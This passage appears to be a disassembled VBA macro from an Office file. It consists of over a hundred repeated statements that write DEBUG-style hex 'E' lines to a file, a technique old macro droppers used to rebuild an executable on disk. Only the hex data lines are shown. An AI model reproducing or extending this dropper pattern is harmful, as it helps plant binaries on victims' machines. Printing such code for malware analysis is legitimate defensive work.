' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 95D0 44 5F 74 75 90 A4 94 AC C0 8A A1 B1 76 8B 9A 54"
' 	PrintItemNL 
' Line #2592:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 95E0 68 73 47 5A 62 3C 4E 55 3D 4B 51 34 42 48 37 46"
' 	PrintItemNL 
' Line #2593:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 95F0 4F 3E 4A 54 3E 48 4F 4C 55 59 4F 58 5C 00 00 04"
' 	PrintItemNL 
' Line #2594:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9600 00 00 F6 F9 F7 E5 E8 E6 DB DD DD D2 D4 D4 C5 C7"
' 	PrintItemNL 
' Line #2595:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9610 C8 AE B1 B5 04 08 0D 99 A1 A8 B0 BB C3 9F AF B6"
' 	PrintItemNL 
' Line #2596:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9620 93 A4 AD 88 9A A5 89 9B A6 AF BF CB DC EC F8 ED"
' 	PrintItemNL 
' Line #2597:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9630 FD FF DB EB F7 BB CC D9 B8 CF DF 81 9A AE 5D 77"
' 	PrintItemNL 
' Line #2598:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9640 8F 5B 77 8F 4F 6B 83 45 5F 77 4B 65 7D 53 6B 81"
' 	PrintItemNL 
' Line #2599:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9650 69 82 96 61 79 8B 72 85 94 50 60 6C 23 2D 34 35"
' 	PrintItemNL 
' Line #2600:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9660 3E 41 47 54 52 3C 45 42 1C 21 20 28 29 2D 37 39"
' 	PrintItemNL 
' Line #2601:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9670 43 29 2F 3C 1D 24 33 06 0D 1C 10 15 1E 12 14 1E"
' 	PrintItemNL 
' Line #2602:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9680 1A 1C 27 1C 23 32 25 30 46 17 26 40 1A 2B 46 51"
' 	PrintItemNL 
' Line #2603:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9690 65 84 8A 9F C5 AB C1 EA B4 C8 F1 A6 B8 E1 81 92"
' 	PrintItemNL 
' Line #2604:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 96A0 B9 4B 5B 80 1F 2E 4F 33 40 60 3B 47 63 1F 2B 43"
' 	PrintItemNL 
' Line #2605:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 96B0 11 19 30 0F 18 2C 0E 15 28 0A 12 23 04 0C 1D 00"
' 	PrintItemNL 
' Line #2606:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 96C0 04 15 02 06 18 0E 12 24 0E 14 27 26 2F 43 2E 3A"
' 	PrintItemNL 
' Line #2607:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 96D0 52 27 36 50 3A 4A 67 3E 51 72 43 57 7A 4B 61 85"
' 	PrintItemNL 
' Line #2608:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 96E0 31 47 6B 2B 41 65 25 3A 5A 35 4B 67 4F 67 7F 51"
' 	PrintItemNL 
' Line #2609:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 96F0 69 7F 37 4F 67 39 53 6B 51 6B 83 43 5B 73 46 5E"
' 	PrintItemNL 
' Line #2610:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9700 74 3B 53 69 3F 57 6D 41 5A 6E 3C 55 69 3E 57 6B"
' 	PrintItemNL 
' Line #2611:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9710 4E 67 7B 65 7E 92 67 81 92 60 7A 8B 82 9C AD 7F"
' 	PrintItemNL 
' Line #2612:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9720 98 AC 40 5B 70 73 8E A3 66 80 98 70 8C A4 78 94"
' 	PrintItemNL 
' Line #2613:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9730 AC 5D 79 91 4A 65 7A 84 9D B1 9F B6 C6 87 9C AB"
' 	PrintItemNL 
' Line #2614:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9740 73 84 91 5F 70 79 61 71 78 54 64 6A 52 60 66 4C"
' 	PrintItemNL 
' Line #2615:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9750 5A 60 50 5C 66 5C 68 72 58 62 69 60 69 6D 5A 63"
' 	PrintItemNL 
' Line #2616:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9760 67 00 00 04 00 00 F5 F5 F5 E9 E9 E9 E3 E3 E3 D1"
' 	PrintItemNL 
' Line #2617:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9770 D1 D1 BD BF C0 B2 B5 B9 00 00 04 9B A4 AD AE BA"
' 	PrintItemNL 
' Line #2618:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9780 C4 A5 B3 BF 9E AE BB 9A AB B8 8F 9F AC C6 D6 E2"
' 	PrintItemNL 
' Line #2619:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9790 E2 F0 FC EA F8 FF E9 F9 FF CA DB E8 A7 B9 CA 93"
' 	PrintItemNL 
' Line #2620:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 97A0 A9 BB 6F 87 9D 57 71 89 6A 86 9E 42 5D 77 3C 57"
' 	PrintItemNL 
' Line #2621:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 97B0 71 54 6E 86 7F 97 AD 72 88 9A 92 A4 B5 6D 7D 8A"
' 	PrintItemNL 
' Line #2622:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 97C0 16 22 2C 30 3B 43 47 51 58 38 41 45 17 1D 22 15"
' 	PrintItemNL 
' Line #2623:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 97D0 1B 22 2C 32 3D 31 39 46 20 29 37 04 0D 1B 12 19"
' 	PrintItemNL 
' Line #2624:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 97E0 28 13 1C 2A 19 21 32 22 2C 3E 29 34 4A 12 20 37"
' 	PrintItemNL 
' Line #2625:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 97F0 0E 1C 33 00 0B 28 4D 62 88 83 99 C3 8D A0 CD 84"
' 	PrintItemNL 
' Line #2626:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9800 94 C2 83 93 BE 6A 78 A2 3F 4A 70 1C 26 48 13 1B"
' 	PrintItemNL 
' Line #2627:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9810 38 29 30 49 0F 17 2E 05 0C 20 0E 15 29 0D 14 28"
' 	PrintItemNL 
' Line #2628:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9820 0D 14 28 00 07 1B 0A 12 23 16 1E 2F 32 3B 4F 1E"
' 	PrintItemNL 
' Line #2629:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9830 28 40 12 1D 38 13 1F 3B 35 43 5F 70 81 9C 7C 8E"
' 	PrintItemNL 
' Line #2630:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9840 AB 66 7A 99 4D 61 84 27 3B 5E 24 39 59 2C 44 62"
' 	PrintItemNL 
' Line #2631:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9850 56 6F 89 50 6A 82 31 4C 66 3F 5A 74 4D 69 81 3F"
' 	PrintItemNL 
' Line #2632:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9860 59 71 47 5F 75 30 48 5E 37 4F 63 43 5B 6D 44 5C"
' 	PrintItemNL 
' Line #2633:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9870 6E 3E 56 68 58 70 82 69 81 93 62 7A 8E 76 8E A2"
' 	PrintItemNL 
' Line #2634:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9880 7D 96 AA 58 71 85 44 5C 70 69 81 95 76 8E A4 7D"
' 	PrintItemNL 
' Line #2635:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9890 98 AD 71 8D A5 4C 67 7C 59 72 86 8F A6 B6 AD C0"
' 	PrintItemNL 
' Line #2636:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 98A0 CD B1 C2 CB A8 B5 BD B5 C1 C7 B7 C3 C9 A9 B5 BB"
' 	PrintItemNL 
' Line #2637:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 98B0 AC BA C0 A4 B2 B8 9E AB B3 91 9C A4 A0 A9 AD 98"
' 	PrintItemNL 
' Line #2638:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 98C0 9F A2 86 8D 90 00 05 08 00 00 F5 F5 F5 ED ED ED"
' 	PrintItemNL 
' Line #2639:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 98D0 DF DF DF D1 D1 D1 C9 CB CC AF B2 B6 00 00 04 B3"
' 	PrintItemNL 
' Line #2640:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 98E0 BC C5 B3 BF CB B7 C7 D4 A0 AF BF 79 89 99 7A 8A"
' 	PrintItemNL 
' Line #2641:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 98F0 97 CF DF EB EF FB FF E2 EE F8 E2 EF FD D1 E1 EE"
' 	PrintItemNL 
' Line #2642:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9900 B5 C5 D5 9D B1 C2 74 8C A0 61 7C 91 78 94 AC 5D"
' 	PrintItemNL 
' Line #2643:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9910 7B 94 4E 69 83 48 62 7A 71 89 9F 61 77 89 3A 4C"
' 	PrintItemNL 
' Line #2644:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9920 5D 12 21 31 1C 29 37 2E 37 44 3D 46 50 27 30 3A"
' 	PrintItemNL 
' Line #2645:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9930 04 0D 17 06 0F 19 20 29 36 31 3A 48 2F 38 46 1A"
' 	PrintItemNL 
' Line #2646:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9940 24 35 1B 25 37 27 32 46 38 43 57 39 46 5C 2B 38"
' 	PrintItemNL 
' Line #2647:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9950 4E 0B 19 30 0C 1A 31 0A 1A 37 4A 5F 85 74 8C B6"
' 	PrintItemNL 
' Line #2648:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9960 7C 8F BC 73 83 B2 77 86 B4 66 73 9F 41 4B 73 22"
' 	PrintItemNL 
' Line #2649:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9970 2B 50 16 1E 3C 25 2C 47 14 1C 33 06 0F 23 0F 17"
' 	PrintItemNL 
' Line #2650:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9980 2E 16 1E 35 1D 24 3D 1F 2A 40 19 28 38 1F 2E 3E"
' 	PrintItemNL 
' Line #2651:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9990 2F 3D 53 23 30 4A 26 32 4E 28 36 52 32 43 5E 4C"
' 	PrintItemNL 
' Line #2652:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 99A0 5D 77 30 43 5E 2B 3D 5A 35 48 69 2E 41 62 2A 3F"
' 	PrintItemNL 
' Line #2653:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 99B0 5F 2E 46 64 58 6F 89 50 6A 82 3B 56 70 48 66 7F"
' 	PrintItemNL 
' Line #2654:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 99C0 51 6D 85 43 5F 77 4C 64 7A 31 4A 5E 3B 53 67 45"
' 	PrintItemNL 
' Line #2655:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 99D0 5D 6F 3B 51 63 39 4F 61 59 71 83 6B 83 95 61 79"
' 	PrintItemNL 
' Line #2656:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 99E0 8D 74 8C A0 77 8F A5 4D 66 7A 5D 75 89 74 8C 9E"
' 	PrintItemNL 
' Line #2657:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 99F0 7A 92 A8 80 98 AE 6F 89 A1 4E 69 7E 64 7C 90 9C"
' 	PrintItemNL 
' Line #2658:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9A00 B0 C1 AF BF CB 87 94 9C 6F 7B 81 7C 87 8B 88 93"
' 	PrintItemNL 
' Line #2659:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9A10 97 8A 95 99 8E 9A A0 83 91 97 8F 9A A2 93 9D A4"
' 	PrintItemNL 
' Line #2660:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9A20 98 A1 A5 AF B6 B9 94 9B 9E 00 04 07 00 00 F7 F7"
' 	PrintItemNL 
' Line #2661:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9A30 F7 F0 F0 F0 DE DE DE CC CC CC C2 C4 C5 B4 B7 BB"
' 	PrintItemNL 
' Line #2662:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9A40 08 0E 13 D2 DB E4 E9 F5 FF B9 C9 D6 7D 8C 9C 67"
' 	PrintItemNL 
' Line #2663:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9A50 77 87 8E 9E AB DA EA F6 E7 F3 FF D9 E5 EF DA E7"
' 	PrintItemNL 
' Line #2664:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9A60 F5 C0 D0 DD A3 B3 C3 A2 B6 C7 82 9A AE 67 82 97"
' 	PrintItemNL 
' Line #2665:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9A70 6F 8B A3 67 83 9B 54 6F 89 5C 76 8E 72 8A A0 6A"
' 	PrintItemNL 
' Line #2666:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9A80 7F 94 3C 4D 60 00 04 14 25 32 42 38 43 51 45 4E"
' 	PrintItemNL 
' Line #2667:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9A90 5B 2E 37 44 10 1C 28 14 1F 2D 23 2E 3C 2E 3B 4B"
' 	PrintItemNL 
' Line #2668:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9AA0 3A 47 57 33 41 53 5C 6A 7D 45 53 69 31 3F 55 24"
' 	PrintItemNL 
' Line #2669:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9AB0 34 4B 22 31 4B 1A 29 43 1E 2F 49 21 35 54 56 6B"
' 	PrintItemNL 
' Line #2670:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9AC0 91 6F 87 B1 6D 80 AD 62 72 A0 69 78 A6 63 70 9C"
' 	PrintItemNL 
' Line #2671:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9AD0 4A 53 7E 32 3B 60 2E 37 58 35 3D 5A 2E 38 50 1C"
' 	PrintItemNL 
' Line #2672:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9AE0 27 3D 1D 27 3F 21 2B 43 20 29 44 2B 39 50 31 45"
' 	PrintItemNL 
' Line #2673:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9AF0 57 36 4C 5E 3B 50 66 2F 42 5D 38 4A 67 3E 53 6F"
' 	PrintItemNL 
' Line #2674:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9B00 44 59 74 4B 60 7B 60 75 90 35 4A 66 2C 40 5F 27"
' 	PrintItemNL 
' Line #2675:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9B10 3A 5B 21 34 55 2F 45 61 5A 70 89 50 68 80 3C 57"
' 	PrintItemNL 
' Line #2676:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9B20 71 4D 6B 84 4D 69 81 43 5F 77 4A 62 78 2D 46 5A"
' 	PrintItemNL 
' Line #2677:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9B30 3A 52 66 40 58 6A 39 4F 61 3C 52 64 5F 75 87 6A"
' 	PrintItemNL 
' Line #2678:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9B40 80 92 5D 75 89 72 8A 9E 75 8D A3 4E 67 7B 6B 83"
' 	PrintItemNL 
' Line #2679:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9B50 97 74 8C 9E 78 90 A6 7F 97 AD 69 84 99 53 6E 83"
' 	PrintItemNL 
' Line #2680:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9B60 77 8F A3 AC C0 D1 9B AB B7 45 52 5A 24 30 36 25"
' 	PrintItemNL 
' Line #2681:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9B70 30 34 2D 38 3C 3C 47 4B 45 51 57 41 4D 53 52 5D"
' 	PrintItemNL 
' Line #2682:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9B80 65 3F 49 50 39 42 45 63 6B 6B 5F 67 67 00 01 01"
' 	PrintItemNL 
' Line #2683:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9B90 00 00 F8 F8 F8 EB EB EB E0 E0 E0 D0 D0 D0 BE C0"
' 	PrintItemNL 
' Line #2684:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9BA0 C1 B8 BB BF 00 00 04 88 91 9A 84 90 9C 80 90 9D"
' 	PrintItemNL 
' Line #2685:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9BB0 91 A0 B0 AC BC CC BA CA D7 A9 B9 C5 93 9F AB A0"
' 	PrintItemNL 
' Line #2686:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9BC0 AC B6 BC CA D6 A6 B6 C3 93 A4 B1 A1 B6 C5 8A A2"
' 	PrintItemNL 
' Line #2687:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9BD0 B4 70 89 9D 67 82 97 62 7E 96 4F 6A 84 67 81 99"
' 	PrintItemNL 
' Line #2688:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9BE0 67 7F 97 66 7B 91 65 76 89 02 12 23 07 13 25 1D"
' 	PrintItemNL 
' Line #2689:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9BF0 27 38 48 55 63 3D 4A 58 40 4F 5F 5F 6E 7E 6B 79"
' 	PrintItemNL 
' Line #2690:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9C00 8B 62 70 82 5A 69 7C 4B 5A 6D 5C 6D 82 38 48 5F"
' 	PrintItemNL 
' Line #2691:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9C10 1A 2B 45 15 26 40 27 3A 55 3A 4C 69 3C 51 6D 3C"
' 	PrintItemNL 
' Line #2692:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9C20 51 70 4D 64 8A 5D 73 9D 5C 6F 9A 54 67 94 5D 6C"
' 	PrintItemNL 
' Line #2693:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9C30 9A 59 66 92 3D 49 73 25 30 56 29 33 55 2B 36 54"
' 	PrintItemNL 
' Line #2694:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9C40 38 44 60 34 41 5B 3C 49 63 46 53 6D 3F 4B 67 50"
' 	PrintItemNL 
' Line #2695:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9C50 5F 79 6C 84 98 68 83 97 58 71 8B 42 5A 76 40 58"
' 	PrintItemNL 
' Line #2696:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9C60 76 44 5C 7A 4B 63 7F 54 6B 85 80 97 B1 3E 54 70"
' 	PrintItemNL 
' Line #2697:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9C70 2B 40 5F 2D 42 62 21 36 55 36 4C 68 5A 70 89 4C"
' 	PrintItemNL 
' Line #2698:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9C80 64 7A 39 54 6E 54 72 8B 4D 69 81 45 5F 77 48 60"
' 	PrintItemNL 
' Line #2699:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9C90 76 2E 47 5B 3D 55 67 39 51 63 3C 52 64 48 5E 70"
' 	PrintItemNL 
' Line #2700:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9CA0 67 7D 8F 6A 80 92 64 7C 90 77 8F A3 72 8A A0 56"
' 	PrintItemNL 
' Line #2701:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9CB0 6F 83 6F 87 9B 70 88 9C 77 8F A5 7C 94 AA 62 7A"
' 	PrintItemNL 
' Line #2702:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9CC0 90 57 70 84 86 9C AE B0 C5 D4 8D 9D A9 3D 4A 52"
' 	PrintItemNL 
' Line #2703:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9CD0 3E 4A 50 40 4B 4F 36 41 45 3B 46 4A 3B 47 4D 37"
' 	PrintItemNL 
' Line #2704:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9CE0 43 49 42 4E 54 37 41 48 4F 58 5B 51 59 59 37 3F"
' 	PrintItemNL 
' Line #2705:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9CF0 3F 00 01 01 00 00 F7 F7 F7 EB EB EB DF DF DF D1"
' 	PrintItemNL 
' Line #2706:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9D00 D1 D1 BE C0 C1 B6 B9 BD 00 00 04 78 81 8A 75 81"
' 	PrintItemNL 
' Line #2707:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9D10 8D AD BD CA E8 F7 FF EC FC FF D6 E6 F3 A4 B4 C0"
' 	PrintItemNL 
' Line #2708:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9D20 87 93 9F 96 A2 AC A0 AF B8 99 A9 B5 95 A6 B3 A3"
' 	PrintItemNL 
' Line #2709:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9D30 B8 C7 90 A6 B8 7A 93 A7 6B 86 9B 69 86 9B 65 81"
' 	PrintItemNL 
' Line #2710:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9D40 99 69 83 9B 6C 84 9C 68 7D 93 71 84 99 23 32 45"
' 	PrintItemNL 
' Line #2711:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9D50 08 13 27 1E 2A 3C 37 45 57 16 26 36 0D 1D 2E 35"
' 	PrintItemNL 
' Line #2712:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9D60 45 56 50 61 74 54 65 78 55 68 7D 4E 60 77 48 5C"
' 	PrintItemNL 
' Line #2713:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9D70 75 33 46 61 24 39 55 15 2A 46 18 2D 4C 2D 42 61"
' 	PrintItemNL 
' Line #2714:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9D80 35 4A 69 42 59 79 4D 65 89 50 66 8F 50 63 8E 4B"
' 	PrintItemNL 
' Line #2715:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9D90 5E 89 53 63 8E 51 61 8C 3D 4B 75 29 35 5D 1A 28"
' 	PrintItemNL 
' Line #2716:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9DA0 4C 18 25 45 25 33 50 27 35 51 33 44 5F 42 52 6F"
' 	PrintItemNL 
' Line #2717:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9DB0 3F 4F 6C 4F 61 7E 7B 95 AD 6A 86 9E 50 6B 86 45"
' 	PrintItemNL 
' Line #2718:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9DC0 5E 7E 48 61 81 4C 65 85 4D 68 83 57 6F 8B 75 8D"
' 	PrintItemNL 
' Line #2719:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9DD0 A9 3E 56 72 33 4B 69 37 4E 6E 20 38 56 36 4E 6A"
' 	PrintItemNL 
' Line #2720:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9DE0 59 71 89 54 6F 84 3F 5A 74 64 7F 99 59 73 8B 4C"
' 	PrintItemNL 
' Line #2721:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9DF0 66 7E 4B 63 79 35 4E 62 42 5A 6C 36 4C 5E 3A 51"
' 	PrintItemNL 
' Line #2722:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9E00 61 53 6A 7A 6D 83 95 6D 83 95 73 8B 9D 7D 95 A7"
' 	PrintItemNL 
' Line #2723:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9E10 6A 82 96 5D 75 89 79 91 A5 78 90 A4 7B 93 A9 76"
' 	PrintItemNL 
' Line #2724:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9E20 8E A4 57 70 84 5C 74 88 8F A6 B6 A9 BC C9 80 91"
' 	PrintItemNL 
' Line #2725:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9E30 9A 43 50 58 50 5C 62 42 4D 51 2D 38 3C 30 3B 3F"
' 	PrintItemNL 
' Line #2726:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9E40 3A 46 4C 43 4F 55 36 42 48 4E 59 5D 6F 79 79 56"
' 	PrintItemNL 
' Line #2727:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 9E50 5E 5D 2C 34 33 00 01 00 00 00 F3 F3 F3 F1 F1 F1"
